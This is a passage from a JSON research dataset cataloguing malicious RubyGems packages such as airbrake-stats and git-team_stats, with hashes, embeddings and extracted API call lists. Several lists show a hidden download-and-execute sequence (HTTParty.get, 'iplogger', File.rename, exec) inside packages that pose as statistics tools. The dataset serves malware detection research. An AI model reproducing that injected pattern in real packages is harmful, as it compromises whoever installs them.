parse_xml(notice, \"error-message\")\\n  action = parse_xml(notice, \"action\")\\n  controller = \"#{controller}##{action}\"\\n  Map.new({ id: id, path: path, format: format, error_message: error_message, url: url, agent: agent, controller: controller })\\n}.compact', 'notices_xml.map', 'notices_xml', 'notice.search(\"http-user-agent\").first', 'notice.search', 'agent.[]', 'agent.[]', 'parse_xml', 'parse_xml', 'parse_xml', 'parse_xml', 'parse_xml', 'parse_xml', 'parse_xml', 'Map.new', 'cache.store', 'cache', '@similar_errors.empty?', 'puts', 'puts', 'notices_xml.map { |n,|\\n  n.search(\"error-message\").first.text\\n}.uniq', 'notices_xml.map', 'notices_xml', 'n.search(\"error-message\").first.text', 'n.search(\"error-message\").first', 'n.search', 'cache.store', 'cache', 'parse', 'notice.search(element).first', 'notice.search', 'node.text', 'Hash.new', 'similar_errors.each', 'similar_errors', 'stats.[]', 'n.[]', 'stats.map { |p,|\\n  h = { total: p.last }\\n  h.[]=(method, p.first)\\n  Map.new(h)\\n}.sort_by', 'stats.map', 'p.last', 'h.[]=', 'p.first', 'Map.new', 'notices_count / 30.+', 'notices_count./', 'notices_count', '@page_count.>', 'max_pages', 'max_pages', 'page_count.*', 'page_count', 'error.search(\"notices-count\").first.text.to_i', 'error.search(\"notices-count\").first.text', 'error.search(\"notices-count\").first', 'error.search', 'error', 'private', 'puts', 'page_count', 'page_count.times', 'page_count', 'parse', '@similar_error_ids.<<', 'errors.search(\"id\").map', 'errors.search', '@similar_error_ids.flatten!', '@similar_error_ids.length.==', '@similar_error_ids.length', 'max_errors', 'puts', 'notices_count', 'max_errors', 'puts', 'notices_count', 'similar_error_ids', 'AirbrakeStats::Queue.new', 'puts', 'similar_error_ids.each_slice', 'similar_error_ids', 'threads.<<', 'Thread.new', 'ids.each_with_index', 'notices_xml.<<', 'parse', 'threads.map', 'puts', 'notices_xml.size', 'notices_xml.to_a', 'ENV.[]', 'error_id', 'ENV.[]', 'params.<<', 'Http.get', 'url', 'Nokogiri.XML', 'response.body', 'response.status.==', 'response.status', 'parsed_response.search(\"error\").first', 'parsed_response.search', 'raise', 'AirbrakeStats::Error.new', 'response.status', 'self.size.times', 'self.size', 'array.<<', 'self.pop']",
            "n_tokens": 1213,
            "embedding": "[-0.01692705 -0.01991359 -0.00217662 ...  0.00541119 -0.01556034\n  0.01653223]",
            "cluster": "0",
            "id": 563,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/airbrake-stats/0.0.1/airbrake-stats-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/airbrake-stats/0.0.1/airbrake-stats-0.0.1_extracted",
            "name": "airbrake-stats",
            "version": "0.0.1",
            "published_at": "2020-02-20T18:55:45.847Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "map, nokogiri, http",
            "SHA-256": "721168cc63b83e50d3e71f9a713359f351caa279ab419c7d607e3a4272cc78c1"
        },
        {
            "name_version": "autoproj_stats-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/autoproj_stats/0.1.0/autoproj_stats-0.1.0_extracted/autoproj_stats-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'desc', 'option', 'option', 'option', 'run_autoproj_cli', 'Hash.[]', 'Array', 'require', 'require', 'require', 'require', 'require', 'Hash.new', 'initialize_and_load', 'finalize_setup', 'source_packages.map', 'ws.manifest.find_autobuild_package', 'ws.manifest', 'ws', 'YAML.load', 'File.read', 'options.[]', '(config.[](\"exclude\") || Set.new)\\n.to_set', 'config.[]', 'Set.new', 'Autoproj::Stats::Sanitizer.new', 'options.[]', 'sanitizer.load', 'options.[]', 'Hash.new', 'Hash.new', 'Hash.new', 'Ops::Stats.new', 'ops.process', 'options.[]', 'TTY::Table.new', 'stats.each', 'excluded.include?', 'pkg.name', '[1, pkg_stats.authors.size, pkg_stats.copyright.size].max', 'pkg_stats.authors.size', 'pkg_stats.authors', 'pkg_stats.copyright.size', 'pkg_stats.copyright', 'pkg_stats.sloc', 'line_count_summary', 'pkg_stats.authors', 'line_count_summary', 'pkg_stats.copyright', 'sanitizer.license_of', 'overall_per_author.merge!', 'pkg_stats.authors', 'v1.+', 'overall_per_copyright.merge!', 'pkg_stats.copyright', 'v1.+', 'overall_copyright_per_license.[]', 'Hash.new', 'copyrights_for_this_license.merge!', 'pkg_stats.copyright', 'v1.+', 'Array.new(row_count).zip', 'Array.new', 'pkg.name', 'per_package_table.<<', 'line.[](1..-1).map', 'line.[]', 'stats.find_all', 'sanitizer.license_of(pkg).!', 'sanitizer.license_of', 'TTY::Table.new', 'overall_copyright_per_license.sort_by(&:first).each', 'overall_copyright_per_license.sort_by', 'Array.new', 'copyrights.size', 'first_col.[]=', 'line_count_summary', 'first_col.zip', 'copyright_per_license_table.<<', 'line.map', 'source_packages.to_set.-', 'source_packages.to_set', 'stats.keys.to_set', 'stats.keys', 'puts', 'no_stats.size', 'no_stats.map(&:name).sort.join', 'no_stats.map(&:name).sort', 'no_stats.map', 'puts', 'no_license.size', 'no_license.map { |pkg, _|\\n  pkg.name\\n}.sort.join', 'no_license.map { |pkg, _|\\n  pkg.name\\n}.sort', 'no_license.map', 'pkg.name', 'puts', 'stats.size', 'puts', 'puts', 'overall_per_author.size', 'options.[]', 'File.open', 'io.puts', 'line_count_summary', 'io.puts', 'TTY::Table.new(author_names.zip(*author_info)).render', 'TTY::Table.new', 'author_names.zip', 'io.puts', 'io.puts', 'line_count_summary', 'io.puts', 'TTY::Table.new(author_names.zip(*author_info)).render', 'TTY::Table.new', 'author_names.zip', 'io.puts', 'io.puts', 'line_count_summary', 'io.puts', 'TTY::Table.new(copyright_names.zip(*copyright_info)).render', 'TTY::Table.new', 'copyright_names.zip', 'io.puts', 'io.puts', 'io.puts', 'copyright_per_license_table.render', 'io.puts', 'io.puts', 'io.puts', 'per_package_table.render', 'io.!=', 'io.close', 'block_given?', 'count_per_category.sort_by', 'count_per_category.sort_by', 'ordered.reverse', 'ordered.map', 'ordered.map', 'count_to_ratios', 'counts.map', 'Float(v)./', 'Float', 'ratio.<', 'Integer', 'ratio.*', 'require', 'attr_reader', 'Autoproj::Stats::Sanitizer.new', 'Concurrent::FixedThreadPool.new', 'Hash.new', 'packages.map', 'Concurrent::Future.execute', 'compute_package_stats', 'futures.inject', 'Hash.new', 'future.value', 'h.[]=', 'future.reason.kind_of?', 'future.reason', 'raise', 'future.reason', 'pkg.error', 'future.reason', 'executor.shutdown', 'executor.wait_for_termination', 'pkg.importer', 'find_generator_for_importer', 'pkg.importer', 'stats_generator.call', 'Autoproj.warn', 'pkg.name', 'pkg.importer.class', 'pkg.importer', 'Autoproj.warn', 'pkg.name', 'importer.class.==', 'importer.class', 'Autoproj::Stats::Git.new', 'sanitizer', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'attr_reader', 'SLOCCounter.new', 'Sanitizer.new', 'pkg.progress_start', 'pkg.importer', 'importer.run_git', 'entries.inject', 'PackageStats.new', 'line.split', 'sloc_counter.find_counter_for_path', 'sloc_counter', 'process_file', 'pkg.warn', 'pkg.progress', 'entries.size', 'proc', 'pkg.importer.run_git', 'pkg.importer', 'Hash.new', 'Hash.new', 'Regexp.new', 'blamed.each', 'line.encode', 'line_matcher.match', 'code.strip', 'code.empty?', 'sloc.call(code).!', 'sloc.call', 'sanitizer.sanitize_author_name', 'sanitizer', 'name.strip', 'sanitizer.compute_copyright_of', 'sanitizer', 'Date.new', 'y.to_i', 'm.to_i', 'd.to_i', 'authors.[]', 'copyrights.[]', 'raise', 'authors.values.inject', 'authors.values', 'PackageStats.new', 'attr_reader', 'attr_reader', 'attr_reader', 'Hash.new', 'Hash.new', 'PackageStats.new', 'sloc.+', 'sloc', 'other.sloc', 'authors.merge', 'authors', 'other.authors', 'v1.+', 'copyright.merge', 'copyright', 'other.copyright', 'v1.+', 'attr_reader', 'attr_reader', 'attr_reader', 'attr_reader', 'Hash.new', 'Hash.new', 'Hash.new', 'YAML.load', 'File.read', 'config.[]', 'config.[]', 'Hash.new', 'config.[]', 'affiliations.each', 'entry.respond_to?', 'simple_copyrights.[]=', 'simple_copyrights', 'timeline_affiliations.[]=', 'timeline_affiliations', 'entry.sort_by', 'licenses.[]', 'licenses', 'pkg.name', 'aliases.[]', 'aliases', 'simple_copyrights.[]', 'simple_copyrights', 'timeline_affiliations.[]', 'timeline_affiliations', 'timeline.inject', 'date.<', 'lambda', 'line.!~', 'lambda', 'line.!~', 'lambda', 'line.!~', 'lambda', 'line.!~', 'lambda']",
            "n_tokens": 1577,
            "embedding": "[-0.00427078 -0.01493803 -0.01392857 ... -0.00350398 -0.01877203\n  0.01192907]",
            "cluster": "0",
            "id": 438,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/autoproj_stats/0.1.0/autoproj_stats-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/autoproj_stats/0.1.0/autoproj_stats-0.1.0_extracted",
            "name": "autoproj_stats",
            "version": "0.1.0",
            "published_at": "2020-02-20T19:01:07.416Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, minitest, autoproj, tty-table",
            "SHA-256": "f7ba3e8ec1258f76d5599a6e3549493f6c5251211e726f7c3b876662266348ea"
        },
        {
            "name_version": "codestats_metrics-reporter-0.1.13",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/codestats_metrics-reporter/0.1.13/codestats_metrics-reporter-0.1.13_extracted/codestats_metrics-reporter-0.1.13_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'metric.data.[]', 'metric.data', 'parse_coverage', 'metric.data.[]', 'metric.data', 'url', 'private', 'Oga.parse_xml', 'File.read', '@metric.data.[]', '@metric.data', 'parse_covered', 'covered * 100./', 'covered.*', 'parse_missed(doc).+', 'parse_missed', 'doc.xpath(\"/report/counter\").map { |c,|\\n  c.get(\"missed\").to_f\\n}.inject', 'doc.xpath(\"/report/counter\").map', 'doc.xpath', 'c.get(\"missed\").to_f', 'c.get', 'doc.xpath(\"/report/counter\").map { |c,|\\n  c.get(\"covered\").to_f\\n}.inject', 'doc.xpath(\"/report/counter\").map', 'doc.xpath', 'c.get(\"covered\").to_f', 'c.get', 'invalid_url_params?', 'build_base_url', 'repository_name', 'build_identifier', 'build_report_file_url', 'build_base_url.nil?', 'build_base_url', 'build_identifier.nil?', 'build_identifier', 'repository_name.nil?', 'repository_name', 'build_report_file_url.nil?', 'build_report_file_url', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'require', '[\"xml\", \"java\"].freeze', 'metric.data.[]', 'metric.data', 'parse_quality', 'metric.data.[]', 'metric.data', 'url', 'private', 'parse_issues', 'parse_xml', 'add_issues_to_files', 'initialize_issues_map', 'average_scores', 'score_files', 'File.read', '@metric.data.[]', '@metric.data', 'Oga.parse_xml', 'doc.xpath(\"//issue\").map', 'doc.xpath', 'i.xpath(\"location\").first.get', 'i.xpath(\"location\").first', 'i.xpath', 'i.get', 'i.get(\"priority\").to_i', 'i.get', 'i.get', 'i.get', 'source_files.map', 'source_files', 'issues.each', 'issues_map.find', 'i.[](:file).==', 'i.[]', 'issue.[]', 'source.[](:issues).push', 'source.[]', 'issues_map.each', 'f.[]=', 'f.[](:issues).inject', 'f.[]', 'a.-', 'e.[](:priority).**', 'e.[]', 'f.[](:score).<', 'f.[]', 'f.[]=', 'issues_map.inject(0) { |a, e|\\n  a + e.[](:score)\\n}./', 'issues_map.inject', 'a.+', 'e.[]', 'issues_map.size', 'Dir.glob', 'source_dir', 'EXTENSIONS.join', 'files.+', 'Dir.glob', 'source_dir', '@metric.data.[]', '@metric.data', 'invalid_url_params?', 'build_base_url', 'repository_name', 'build_identifier', 'build_report_file_url', 'build_base_url.nil?', 'build_base_url', 'build_identifier.nil?', 'build_identifier', 'repository_name.nil?', 'repository_name', 'build_report_file_url.nil?', 'build_report_file_url', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'respond_to?', 'service.downcase', 'send', 'service.downcase', 'ENV.[]', 'ENV.[]', 'ENV.[](\"TRAVIS_REPO_SLUG\").split(\"/\").[]', 'ENV.[](\"TRAVIS_REPO_SLUG\").split', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[]', 'ENV.[](\"GIT_REPOSITORY_URL\").split(\"/\").[](1).gsub', 'ENV.[](\"GIT_REPOSITORY_URL\").split(\"/\").[]', 'ENV.[](\"GIT_REPOSITORY_URL\").split', 'ENV.[]', 'require', 'attr_reader', 'ConfigStore.new', 'config_store.metrics_configs.each', 'config_store.metrics_configs', 'config_store', 'process_and_report_metric', 'config_store', 'puts', 'e.message', 'e.backtrace', 'private', 'puts', 'metric_config.data.[]', 'metric_config.data', 'generate_metric_data', 'data.nil?', 'post_report_metric', 'puts', 'metric_config.data.[]', 'metric_config.data', 'Object.const_get(\"CodeStats::Metrics::Reporter::#{generate_class_name(metric_config)}\").generate_data', 'Object.const_get', 'generate_class_name', 'metric_config.data.[](\"metric\").split(\"_\").map(&:capitalize).join', 'metric_config.data.[](\"metric\").split(\"_\").map', 'metric_config.data.[](\"metric\").split', 'metric_config.data.[]', 'metric_config.data', 'HTTParty.post', 'config_store.url', 'config_store', 'metric_data', 'config_store.token.to_s', 'config_store.token', 'config_store', 'Ci.data(config_store.ci).[]', 'Ci.data', 'config_store.ci', 'config_store', 'data.[]', 'data.[]', 'data.[]', 'data.[]', 'Ci.data(config_store.ci).[]', 'Ci.data', 'config_store.ci', 'config_store', 'require', 'require', '\".codestats.yml\".freeze', 'File.realpath', 'File.join', 'File.dirname', 'File.join', 'load_default_file', 'load_user_file', 'load_yml_file', 'default_file.nil?', 'default_file.[](\"config\").merge', 'default_file.[]', 'load_default_metrics_configs', 'default_file.[]', 'load_yml_file', 'File.realpath', 'user_file.nil?', '@default_data.merge', 'user_file.[]', '@user_data.[]=', 'user_file.[](\"metrics\").nil?', 'user_file.[]', 'load_user_metrics_configs', 'user_file.[]', 'File.exist?', 'IO.read', 'YAML.load', 'ERB.new(yaml_code).result', 'ERB.new', 'metrics.each', '@default_data.[](:metrics_configs).<<', '@default_data.[]', 'MetricConfig.new', 'metric_data.merge', '@default_data.[](:metrics_configs).each', '@default_data.[]', 'user_metrics.[]', 'metric_default_config.data.[]', 'metric_default_config.data', 'metric_enabled?', '@user_data.[](:metrics_configs).<<', '@user_data.[]', 'MetricConfig.new', 'metric_default_config.data.merge', 'metric_default_config.data', 'user_metric_data.nil?.!', 'user_metric_data.nil?', 'user_metric_data.[]', 'attr_reader', 'ConfigLoader.load_file', 'configs.[]', 'configs.[]', 'configs.[]', 'configs.[]', 'require', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'maintainability', 'url', 'private', 'invalid_url_params?', 'build_base_url', 'repository_name', 'build_identifier', 'build_report_file_url', 'build_base_url.nil?', 'build_base_url', 'build_identifier.nil?', 'build_identifier', 'repository_name.nil?', 'repository_name', 'build_report_file_url.nil?', 'build_report_file_url', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'JSON.parse', 'File.read', '@metric.data.[]', '@metric.data', 'json.[](\"maintainability\") * 100./', 'json.[](\"maintainability\").*', 'json.[]', 'require', '@metric.data.[]', '@metric.data', 'parse_coverage', '@metric.data.[]', '@metric.data', 'url', 'private', 'File.read', '@metric.data.[]', '@metric.data', 'Oga.parse_xml(xml).xpath(\"coverage\").[](0).get(\"line-rate\").to_f.*', 'Oga.parse_xml(xml).xpath(\"coverage\").[](0).get(\"line-rate\").to_f', 'Oga.parse_xml(xml).xpath(\"coverage\").[](0).get', 'Oga.parse_xml(xml).xpath(\"coverage\").[]', 'Oga.parse_xml(xml).xpath', 'Oga.parse_xml', 'invalid_url_params?', 'build_base_url', 'repository_name', 'build_identifier', 'build_report_file_url', 'build_base_url.nil?', 'build_base_url', 'build_identifier.nil?', 'build_identifier', 'repository_name.nil?', 'repository_name', 'build_report_file_url.nil?', 'build_report_file_url', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'attr_reader', 'require', 'require', 'upload_report?', 'valid_uploader_data?.!', 'valid_uploader_data?', '@metric.data.[]', '@metric.data', 'generate_score_file', 'upload_report?', 'uploader_url', '@metric.data.[]', '@metric.data', 'private', 'bucket', 'project', 'branch', 'Pathname.new', '@metric.data.[]', '@metric.data', 'upload_report?', 'build_uploader.upload', 'build_uploader', 'File.realpath(base_dir).to_s', 'File.realpath', 'bucket', 'File.read', 'base_dir.join', '/var\\\\sscore\\\\s=\\\\s[0-9]*\\\\.?[0-9]+/.match(output).to_s.scan(/[0-9]*\\\\.?[0-9]+/).first', '/var\\\\sscore\\\\s=\\\\s[0-9]*\\\\.?[0-9]+/.match(output).to_s.scan', '/var\\\\sscore\\\\s=\\\\s[0-9]*\\\\.?[0-9]+/.match(output).to_s', '/var\\\\sscore\\\\s=\\\\s[0-9]*\\\\.?[0-9]+/.match', '@metric.data.[]', '@metric.data', '[\"uploader_key\", \"uploader_secret\", \"uploader_region\", \"uploader_bucket\"].all?', '@metric.data.[](value).nil?.!', '@metric.data.[](value).nil?', '@metric.data.[]', '@metric.data', 'S3Uploader::Uploader.new', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'project', 'branch', '@metric.data.[]', '@metric.data', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', '@metric.data.[]', '@metric.data', 'require', 'File.directory?', 'File.file?', 'empty_value', 'JSON.parse', 'File.read', 'json.[](\"result\").[]', 'json.[]', 'metric.data.[]', 'metric.data', 'metric.data.[]', 'metric.data', 'metric.data.[]', 'metric.data', 'metric.data.[]', 'metric.data', 'require', 'require', 'require', 'upload_report?', 'valid_uploader_data?.!', 'valid_uploader_data?', '@metric.data.[]', '@metric.data', 'generate_score_file', 'upload_report?', 'uploader_url', '@metric.data.[]', '@metric.data', 'private', 'bucket', 'project', 'id', 'Pathname.new', '@metric.data.[]', '@metric.data', 'upload_report?', 'build_uploader.upload', 'build_uploader', 'File.realpath(base_dir).to_s', 'File.realpath', 'bucket', 'File.read', 'base_dir.join', 'parse_coverage', '@metric.data.[]', '@metric.data', 'Oga.parse_html(html).xpath(\"html/body/div/div/h4\").text', 'Oga.parse_html(html).xpath', 'Oga.parse_html', 'coverage_header.match', 'total_coverage.[](0).to_f', 'total_coverage.[]', '[\"uploader_key\", \"uploader_secret\", \"uploader_region\", \"uploader_bucket\"].all?', '@metric.data.[](value).nil?.!', '@metric.data.[](value).nil?', '@metric.data.[]', '@metric.data', 'S3Uploader::Uploader.new', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'project', 'id', '@metric.data.[]', '@metric.data', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', '@metric.data.[]', '@metric.data', 'require', 'require', 'require', 'metric.data.[]', 'metric.data', 'parse_quality', 'metric.data.[]', 'metric.data', 'url', 'private', 'upload_report', 'code_quality', 'Pathname.new', '@metric.data.[]', '@metric.data', 'File.read', 'base_dir.join', 'Oga.parse_html(html).xpath(\"html/body/table[2]/tbody/tr[2]/td[2]\").text.to_i', 'Oga.parse_html(html).xpath(\"html/body/table[2]/tbody/tr[2]/td[2]\").text', 'Oga.parse_html(html).xpath', 'Oga.parse_html', 'Oga.parse_html(html).xpath(\"html/body/table[2]/tbody/tr[3]/td[2]\").text.to_i', 'Oga.parse_html(html).xpath(\"html/body/table[2]/tbody/tr[3]/td[2]\").text', 'Oga.parse_html(html).xpath', 'Oga.parse_html', 'total_errors.*', 'total_warnings.*', '[0, total].max', 'upload_report?', 'build_uploader.upload', 'build_uploader', 'File.realpath(@metric.data.[](\"report_dir\")).to_s', 'File.realpath', '@metric.data.[]', '@metric.data', 'bucket', 'S3Uploader::Uploader.new', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'project', 'id', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'bucket', 'project', 'id', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', '@metric.data.[]', '@metric.data', 'require', '[\"swift\"].freeze', 'metric.data.[]', 'metric.data', 'parse_quality', 'metric.data.[]', 'metric.data', 'url', 'private', 'parse_violations', 'parse_json', 'initialize_violations_map', 'parse_json', 'fill_violations_map', 'average_scores', 'score_files', 'upload_report', 'JSON.parse', 'File.read', '@metric.data.[]', '@metric.data', 'json_file.[](\"files\").map', 'json_file.[]', 'file.[](\"violations\").map', 'file.[]', 'file.[]', 'violation.[]', 'violations.flatten', 'json_file.[](\"files\").map', 'json_file.[]', 'file.[]', 'violations.each', 'violations_map.find', 'each.[](:location).==', 'each.[]', 'i.[]', 'violation.[](:violations).push', 'violation.[]', 'each.[]', 'violations_map.each', 'each.[]=', 'each.[](:violations).inject', 'each.[]', 'a.-', 'each.[](:score).<', 'each.[]', 'each.[]=', 'each.delete', 'violations_map.inject(0) { |a, e|\\n  a + e.[](:score)\\n}./', 'violations_map.inject', 'a.+', 'e.[]', 'violations_map.size', 'upload_report?', 'build_uploader.upload', 'build_uploader', 'File.realpath(@metric.data.[](\"report_dir\")).to_s', 'File.realpath', '@metric.data.[]', '@metric.data', 'bucket', 'S3Uploader::Uploader.new', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'project', 'id', '@metric.data.[]', '@metric.data', '@metric.data.[]', '@metric.data', 'bucket', 'project', 'id', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', 'Ci.data(@config_store.ci).[]', 'Ci.data', '@config_store.ci', '@metric.data.[]', '@metric.data', '\"0.1.13\".freeze']",
            "n_tokens": 3862,
            "embedding": "[-0.00744747  0.00198712 -0.01572545 ...  0.00364024 -0.0189211\n  0.00489728]",
            "cluster": "0",
            "id": 473,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/codestats_metrics-reporter/0.1.13/codestats_metrics-reporter-0.1.13.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/codestats_metrics-reporter/0.1.13/codestats_metrics-reporter-0.1.13_extracted",
            "name": "codestats_metrics-reporter",
            "version": "0.1.13",
            "published_at": "2020-02-20T19:08:36.134Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rspec, pry, rubocop, rake, httparty, s3_uploader, oga",
            "SHA-256": "fcd9c6a2bbbe4a2485c96a8fb6de5424727d03a617fa8c285bb4c62ec835a05b"
        },
        {
            "name_version": "get-stats-0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/get-stats/0.3/get-stats-0.3_extracted/get-stats-0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['attr_accessible', 'attr_accessible', 'attr_accessible', 'Time.now', 'Stats.find', 'date.to_date', 'stat.update_attributes', 'stat.count.+', 'stat.count', 'Stats.create!', 'date.to_date', 'start_date.<=', '@stats.select', 'c.stat_date.==', 'c.stat_date', 'today_stats.blank?', '@return_stat.<<', '@return_stat.<<', 'today_stats.[](0).stat_date', 'today_stats.[]', 'today_stats.[](0).count', 'today_stats.[]', 'start_date.+', 'Date.today', 'end_date.-', '1.week', 'end_date.-', '1.month', 'end_date.-', '1.week', 'find_date_range', 'report_start_date.nil?.!', 'report_start_date.nil?', 'report_end_date.nil?.!', 'report_end_date.nil?', 'report_start_date.to_date', 'report_end_date.to_date', 'Stats.find', 'process_daily_stats', '[\"monthly\", \"weekly\"].each', 'class_eval', 'Stats.find', 'start_date.<=', '@stats.select', 'c.stat_date.==', 'c.stat_date', 'today_stats.blank?.!', 'today_stats.blank?', 'stat_collection.+', 'today_stats.[](0).count', 'today_stats.[]', 'method_type.==', 'start_date.monday?', 'start_date.mday.==', 'start_date.mday', 'start_date.!=', '@return_stat.<<', 'method_type.==', 'start_date.-', '1.week', 'start_date.-', '1.month', 'start_date + 1.day.==', 'start_date.+', '1.day', 'conitions_day.!', '@return_stat.<<', 'start_date.+', '1.day', 'end_date.nil?', 'Date.today', 'start_date.nil?', 'start_date.>=', 'method_type.==', 'end_date.-', '4.months', 'method_type.==', 'end_date.-', '1.month', 'method_type.==', 'start_date - start_date.wday.+', 'start_date.-', 'start_date.wday', 'start_date - start_date.mday.+', 'start_date.-', 'start_date.mday', 'Stats.find', '@stats.each', '@stat_names.<<', 's.stat_name', 'require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'Rails::VERSION::MAJOR.==', 'require', 'require', 'require', 'include', 'File.join', 'File.dirname', 'ActiveRecord::Base.timestamped_migrations', 'Time.now.utc.strftime', 'Time.now.utc', 'Time.now', '\"%.3d\".%', 'current_migration_number(dirname).+', 'current_migration_number', 'File.open', 'File.join', 'File.dirname', 'f.read', 'f.close', 'schema.gsub!', 'schema.gsub!', 'File.open', 'File.join', 'File.dirname', 'f.read', 'f.close', 'migration.gsub!', 'File.open', 'tmp.write', 'tmp.close', 'migration_template', 'remove_file', 'migration_template', 'remove_file', 'create_table', 't.string', 't.date', 't.integer', 't.timestamps', 'add_index', 'drop_table', 'drop_table']",
            "n_tokens": 769,
            "embedding": "[ 0.0049763  -0.00987647 -0.00772135 ...  0.00748347 -0.023616\n  0.02213167]",
            "cluster": "0",
            "id": 388,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/get-stats/0.3/get-stats-0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/get-stats/0.3/get-stats-0.3_extracted",
            "name": "get-stats",
            "version": "0.3",
            "published_at": "2020-02-20T19:36:05.935Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": NaN,
            "SHA-256": "dc3a3d2d41401f57e4d84110c29dd2cb3affc99548841d25dfd21e6dd9db48a9"
        },
        {
            "name_version": "git-team_stats-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/git-team_stats/0.0.1/git-team_stats-0.0.1_extracted/git-team_stats-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', '@project.[]=', '@project.[](:repos).each', '@project.[]', '@project.[](:parsers).push', '@project.[]', 'GitParse.new', '@inspected.!', 'self.inspect_commits', '@commits_in_detail.length', '@project.[](:parsers).each', '@project.[]', 'parser.get_commits', 'self.collect_commits', '@project.[](:parsers).each', '@project.[]', 'parser.get_commit_details', 'self.inspect_commits', '@commits_in_detail.each', 'team_cumulative.[]', 'team_cumulative.[]', 'commit.[]', 'team_cumulative.[]', 'commit.[]', 'commit.[](:file_types).each', 'commit.[]', 'team_cumulative.[](:file_types).key?', 'team_cumulative.[]', 'team_cumulative.[](:file_types).[](language).[]', 'team_cumulative.[](:file_types).[]', 'team_cumulative.[]', 'details.[]', 'team_cumulative.[](:file_types).[](language).[]', 'team_cumulative.[](:file_types).[]', 'team_cumulative.[]', 'details.[]', 'team_cumulative.[](:file_types).[]=', 'team_cumulative.[]', 'details.[]', 'details.[]', 